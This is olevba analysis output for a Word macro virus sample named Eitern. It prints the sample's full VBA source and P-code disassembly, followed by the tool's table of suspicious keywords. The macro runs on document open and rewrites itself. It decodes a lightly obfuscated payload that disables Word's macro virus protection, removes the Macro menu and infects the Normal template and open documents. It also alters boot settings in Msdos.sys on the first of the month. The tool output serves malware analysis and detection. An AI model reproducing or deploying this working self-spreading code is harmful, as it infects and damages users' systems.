olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Eitern
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Eitern - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Open "C:\Eitern.inf" For Output As #1: Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines): Close #1
I = (MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(8, 1))
For X = 2 To Len(I): B$ = Asc(Mid(I, X, 1)) - 1: C$ = C$ & Chr(B$): Next X: A = C$
MacroContainer.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, "Private Sub Document_Close()"
MacroContainer.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 8, A
MacroContainer.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 2, 6
'Po!Fssps!Sftvnf!Ofyu;!Pqujpot/DpogjsnDpowfstjpot!>!)1!.!1*;!Pqujpot/TbwfOpsnbmQspnqu!>!)2!.!2*;!Pqujpot/WjsvtQspufdujpo!>!)3!.!3*;!DpnnboeCbst)#Uppmt#*/Dpouspmt)#Nbdsp#*/Efmfuf
Jg!Ebz)2*!Uifo;!TfuBuus!#D;]Ntept/tzt#-!wcOpsnbm;!Tztufn/QsjwbufQspgjmfTusjoh)#D;]Ntept/tzt#-!#Pqujpot#-!#CppuHVJ#*!>!#1#;!TfuBuus!#D;]Ntept/tzt#-!wcTztufn!,!wcIjeefo!,!wcSfbePomz
OpsnbmUfnqmbuf/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/EfmfufMjoft!2-!OpsnbmUfnqmbuf/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/DpvouPgMjoft;!BdujwfEpdvnfou/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/EfmfufMjoft!2-!BdujwfEpdvnfou/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/DpvouPgMjoft
OpsnbmUfnqmbuf/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/BeeGspnGjmf!)#D;]Fjufso/jog#*;!BdujwfEpdvnfou/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/BeeGspnGjmf!)#D;]Fjufso/jog#*;!BdujwfEpdvnfou/TbwfBt!GjmfObnf!>!BdujwfEpdvnfou/GvmmObnf
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Intended.Eitern
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3205 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	LitStr 0x000D "C:\Eitern.inf"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #2:
' 	LitDI2 0x0008 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Paren 
' 	St I 
' Line #3:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld I 
' 	FnLen 
' 	For 
' 	BoS 0x0000 
' 	Ld I 
' 	Ld X 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	St B$ 
' 	BoS 0x0000 
' 	Ld C$ 
' 	Ld B$ 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St C$ 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	Ld C$ 
' 	St A 
' Line #4:
' 	LitDI2 0x0001 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #5:
' 	LitDI2 0x0008 
' 	Ld A 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #6:
' 	LitDI2 0x0002 
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #7:
' 	QuoteRem 0x0000 0x036D "Po!Fssps!Sftvnf!Ofyu;!Pqujpot/DpogjsnDpowfstjpot!>!)1!.!1*;!Pqujpot/TbwfOpsnbmQspnqu!>!)2!.!2*;!Pqujpot/WjsvtQspufdujpo!>!)3!.!3*;!DpnnboeCbst)#Uppmt#*/Dpouspmt)#Nbdsp#*/Efmfuf
' Jg!Ebz)2*!Uifo;!TfuBuus!#D;]Ntept/tzt#-!wcOpsnbm;!Tztufn/QsjwbufQspgjmfTusjoh)#D;]Ntept/tzt#-!#Pqujpot#-!#CppuHVJ#*!>!#1#;!TfuBuus!#D;]Ntept/tzt#-!wcTztufn!,!wcIjeefo!,!wcSfbePomz
' OpsnbmUfnqmbuf/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/EfmfufMjoft!2-!OpsnbmUfnqmbuf/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/DpvouPgMjoft;!BdujwfEpdvnfou/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/EfmfufMjoft!2-!BdujwfEpdvnfou/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/DpvouPgMjoft
' OpsnbmUfnqmbuf/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/BeeGspnGjmf!)#D;]Fjufso/jog#*;!BdujwfEpdvnfou/WCQspkfdu/WCDpnqpofout/Jufn)2*/DpefNpevmf/BeeGspnGjmf!)#D;]Fjufso/jog#*;!BdujwfEpdvnfou/TbwfBt!GjmfObnf!>!BdujwfEpdvnfou/GvmmObnf"
' Line #8:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Eitern.inf          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

